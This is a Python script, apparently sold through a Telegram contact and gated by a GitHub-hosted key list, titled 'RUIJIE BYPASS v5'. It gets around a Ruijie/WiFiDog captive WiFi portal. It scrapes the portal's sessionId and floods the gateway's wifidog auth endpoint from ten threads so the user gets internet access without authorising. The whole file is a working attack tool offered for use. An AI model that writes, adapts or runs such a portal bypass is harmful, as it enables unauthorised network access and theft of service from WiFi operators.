#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import re
import urllib3
import time
import threading
import random
import os
import sys
import subprocess
import importlib.util
from urllib.parse import urlparse, parse_qs, urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ===============================
# CONFIGURATION
# ===============================
GITHUB_KEY_URL = "https://raw.githubusercontent.com/phyoewai1026-hash/my-bypass-key/main/keys.txt"
LOCAL_KEYS_FILE = os.path.expanduser("~/.turbo_cache_key.txt")
DEFAULT_GW = "192.168.110.1"

# Colors
red, bred = "\033[0;31m", "\033[1;31m"
green, bgreen = "\033[0;32m", "\033[1;32m"
yellow, byellow = "\033[0;33m", "\033[1;33m"
cyan, bcyan = "\033[0;36m", "\033[1;36m"
reset = "\033[00m"

# ===============================
# SECURITY & ID SYSTEM
# ===============================
def get_system_key():
    try:
        uid = os.geteuid()
        username = os.environ.get('USER', 'unknown')
        return f"{uid}{username}"
    except:
        return "1000unknown"

def check_offline_approval():
    """ဖုန်းထဲမှာ Key သိမ်းထားပြီးသားလား စစ်ဆေးခြင်း"""
    if os.path.exists(LOCAL_KEYS_FILE):
        with open(LOCAL_KEYS_FILE, 'r') as f:
            saved_key = f.read().strip()
            return saved_key == get_system_key()
    return False

def verify_online_and_save(system_key):
    """Bypass လုပ်ပြီး အင်တာနက်ရလာလျှင် GitHub နှင့် တိုက်စစ်ပြီး သိမ်းဆည်းခြင်း"""
    try:
        r = requests.get(GITHUB_KEY_URL, timeout=10, verify=False)
        if r.status_code == 200:
            auth_keys = [line.split('|')[0].strip() for line in r.text.strip().split('\n') if line.strip()]
            if system_key in auth_keys:
                with open(LOCAL_KEYS_FILE, 'w') as f:
                    f.write(system_key)
                return True
    except: pass
    return False

# ===============================
# ENGINE LOGIC
# ===============================
def check_real_internet():
    try:
        return requests.get("http://www.google.com", timeout=3).status_code == 200
    except: return False

def high_speed_ping(auth_link):
    session = requests.Session()
    while True:
        try:
            session.get(auth_link, timeout=5, verify=False)
            print(f"{green}[✓]{reset} Engine Active | Status: Pinging...", end="\r")
        except: pass
        time.sleep(random.uniform(0.05, 0.1))

def bypass_engine_start():
    """Bypass လုပ်ငန်းစဉ်စတင်ခြင်း"""
    print(f"\n{cyan}[*] Detecting WiFi Portal...{reset}")
    try:
        r = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
        if r.url == "http://connectivitycheck.gstatic.com/generate_204" and check_real_internet():
            print(f"{green}[✓] Already Connected to Internet!{reset}")
            return True
        
        # SID ရှာဖွေခြင်း
        portal_url = r.url
        r2 = requests.get(portal_url, verify=False, timeout=10)
        sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
        if not sid:
            sid_match = re.search(r'sessionId=([a-zA-Z0-9\-]+)', r2.text)
            sid = sid_match.group(1) if sid_match else None
            
        if sid:
            print(f"{green}[✓] SID Captured: {sid}{reset}")
            auth_link = f"http://{DEFAULT_GW}:2060/wifidog/auth?token={sid}"
            for _ in range(10):
                threading.Thread(target=high_speed_ping, args=(auth_link,), daemon=True).start()
            return True
        else:
            print(f"{red}[X] SID not found! Browser မှာ Login Page အရင်ဖွင့်ပါ။{reset}")
            return False
    except Exception as e:
        print(f"{red}[!] Engine Error: {e}{reset}")
        return False

# ===============================
# MAIN FLOW
# ===============================
def main():
    os.system('clear')
    my_key = get_system_key()
    
    print(f"{bcyan}╔════════════════════════════════════════════════╗")
    print(f"                RUIJIE BYPASS v5                                                ")
    print(f"       For Key Approved _Contact TG-@CYCLEA7                                    ")
    print(f"╚════════════════════════════════════════════════╝{reset}")
    print(f"[*] YOUR ID: {byellow}{my_key}{reset}")

    # ၁။ Offline အောင်ပြီးသားဆိုရင် တန်းပွင့်မယ်
    if check_offline_approval():
        print(f"{green}[✓] Status: Offline Approved{reset}")
        bypass_engine_start()
        while True: time.sleep(10)
    
    # ၂။ Offline မအောင်သေးရင် Bypass အရင်လုပ်ပြီးမှ Online စစ်မယ်
    print(f"{yellow}[!] First time setup: Bypass လုပ်ပြီးမှ Key စစ်ပါမည်။{reset}")
    print(f"\n{bgreen}[1]{reset} Start Bypass & Verify Key\n{red}[2]{reset} Exit")
    
    choice = input(f"\n{bcyan}[?]{reset} Select: ")
    if choice == '1':
        if bypass_engine_start():
            print(f"\n{cyan}[*] Waiting for internet access to verify key...{reset}")
            # အင်တာနက်ရအောင် စက္ကန့် ၃၀ စောင့်ပြီး Key လှမ်းစစ်မယ်
            for i in range(15):
                time.sleep(2)
                if check_real_internet():
                    if verify_online_and_save(my_key):
                        print(f"\n{bgreen}╔══════════════════════════════════════════╗")
                        print(f"║       ✓ KEY VERIFIED & SAVED OFFLINE ✓   ║")
                        print(f"╚══════════════════════════════════════════╝{reset}")
                        while True: time.sleep(10)
                    else:
                        print(f"\n{red}[X] Access Denied: Key not found on GitHub!{reset}")
                        sys.exit()
            print(f"\n{red}[!] Timeout: အင်တာနက်မပွင့်လာလို့ Key စစ်လို့မရပါ။{reset}")
    else:
        sys.exit()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{red}Stopped.{reset}")
        sys.exit()
